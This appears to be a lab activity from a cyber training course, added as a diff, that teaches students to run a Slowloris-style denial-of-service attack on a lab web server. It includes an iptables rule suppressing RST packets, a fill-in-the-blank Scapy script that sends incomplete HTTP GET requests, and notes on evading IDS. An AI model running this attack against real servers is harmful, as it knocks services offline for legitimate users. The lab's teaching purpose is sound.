@@ -1,0 +1,155 @@
+:doctype: book
+:stylesheet: ../../global-objects/resources/raw/master/css/stylefactoryfiles/_asciidoc.scss
+:icons: image
+:icondir: ../Images/adoc_icons
+
+image::https://git.cybbh.space/global-objects/resources/raw/master/images/USACYSup001.png[Cyber,180,141]
+
+{empty} +
+
+Version Date: 20 November 2018
+
+{empty} +
+
+= Activity - DoS with Scapy
+
+Scapy is a python based tool for packet crafting developed by Phillipe Biordi. It can easily manipulate any layer of the TCP/IP stack, even the application data.
+
+Scapy is maintained at https://github.com/secdev/scapy.
+
+In the first Scapy activity interaction was performed using the interactive shell mode. This activity introduces how Scapy is used as a python module. Python and raw sockets will be covered in detail in Section 2: Packet Creation and Manipulation.
+
+This activity is performed using the net1 host to interact with nix1-net3 in the Openstack environment.
+
+[blue]#_Note: Resources have been provided at the end of this document to assist you if needed. However, you should attempt this activity initially without using the resources._#
+
+{empty} +
+
+== Learning Objectives
+
+* SKILL CCNE001: Networking Fundamentals ¹ ²
+** CCNE001.001 Understanding the OSI model and Networking ¹
+* SKILL CCNE002: Network Header fields ¹ ²
+** CCNE002.001 Describe security implications present in header fields ²
+* SKILL CCNE003: Layer 2 Switching Technologies ¹ ²
+
+=== Outcomes
+
+* By the end of the activity, students will identify the implications of insecure protocols. Students will use their comprehension of the first Scapy activity to perform a DoS attack on a web server. Students will use Scapy as a python module to craft network headers. Students will assess their effectiveness through traffic analysis.
+
+{empty} +
+
+---
+
+
+*Initial Setup:* +
+
+On the Web Server (nix1_net3), examine the network connections using the following command:
+----
+ss -antp
+----
+
+* The server should be listening on port 80
+
+Perform the same command on the net1 host, and connect to the webpage nix1_net3 is hosting.
+
+* You should see a connection to the nix1_net3 web server address at port 80 from the net1 address with an ephemeral high port.
+
+{empty} +
+
+*Block RST Packets Using IPTables* +
+
+In order for the attack to work, packets marked with RST in the TCP header must be blocked, otherwise the Linux kernel will interfere and send RST marked packets back to the web server. The Kernel isn't aware that Scapy is creating the traffic and will respond with RST since it isn't expecting the incoming traffic. This is true with any raw socket implementation where a response is expected.
+
+* Perform the following commands on the attacker host (net1) to prevent this from happening:
+----
+iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP
+----
+_This command configures the filter table's OUTPUT chain to drop TCP RST flags silently_
+
+{empty} +
+
+*Scripting with Scapy*
+
+Previously, Scapy was used in interactive mode, now Scapy will be imported into Python to create a script.
+
+* Create a Python script to attack the web server.
+
+Type: +
+----
+ nano httpattack.py
+----
+_Use vim if you prefer_
+
+* Read the comments and insert the necessary data where the question marks exist currently.
+
+----
+import sys
+from scapy.all import *
+
+target = ? #web server address in quotes (i.e. "10.x.x.x")
+srcport = ? #source port from attacker (any ephemeral high value)
+gets = ? #number of http get requests to issue
+
+ip = IP()
+ip.dst = target
+print ip.summary()
+
+for x in range(srcport, srcport+gets-1):
+  tcp = TCP()
+  tcp.dport = ? #port for http
+  tcp.sport = x
+  tcp.flags = ? #flag to initiate a three way handshake in quotes
+  ans = sr1(ip/tcp, verbose=0) #send and receive once packet with ip and tcp
+  tcp.seq = ans.ack
+  tcp.ack = ans.seq + 1 #create the appropriate ACK response with a sequence number +1
+  tcp.flags = "A"
+  get = "GET / HTTP/1.1\r\nHost: " + target #craft HTTP header to the web server (see comments below for explanation)
+  ans = sr1(ip/tcp/get, verbose=0) #send and receive the packet once with the IP header, TCP Header, and a HTTP Get Request
+  print "Attack on Port ", x
+----
+
+Browsers follow link:https://www.w3.org/Protocols/rfc2616/rfc2616-sec2.html#sec2.2[RFC2616] section 2.2.
+An example of a normal HTTP GET request with the minimum amount of elements is listed below:
+----
+GET / HTTP/1.1\r\n\r\n'
+----
+_What is missing in the script? This will be the basis for the attack._
+
+* Chmod your python script after filling in the required parameters and issue the ss command on the web server to examine the changes.
+
+{empty} +
+
+* Limit the number of pids available to the nix2 web server to simulate resource exhaustion.
+
+----
+echo 301 > /proc/sys/kernel/pid_max
+----
+
+* Perform the attack against the net2 host again.
+
+_Try accessing the webpage, what did you observe?_
+_Is the nix2 host responsive via Openstack?_
+
+
+
+*Putting it all together:*
+
+The final carriage return and line feed are missing and the server cannot respond. The server keeps it's connection open since it is an incomplete request. Continuously sending HTTP GET requests opens multiple connections, the connection pool will be filled and legitimate connection attempts are denied since the maximum possible connections has been exceeded. +
+
+The host server can only maintain a certain amount of threads for concurrent connections. Each thread will attempt to stay alive while waiting for the slow request to complete, which will never occur.  A benefit to this attack is that it is low bandwidth and only attempts to consume server resources as opposed to a more traditional brute force attack. Additionally, this attack can slip past IDS's due to sending partial packets opposed to malformed packets. +
+
+With the understanding of the attack that was just performed, perform independent research to determine what the official name of the attack is.
+
+
+== Hints
+* N/A
+
+== Challenge
+
+
+== Useful Resources
+* https://scapy.readthedocs.io/en/latest/index.html
+* https://scapy.net/
+* https://www.tutorialspoint.com/http/http_requests.htm
+* link:https://www.w3.org/Protocols/rfc2616/rfc2616-sec2.html#sec2.2[RFC2616]
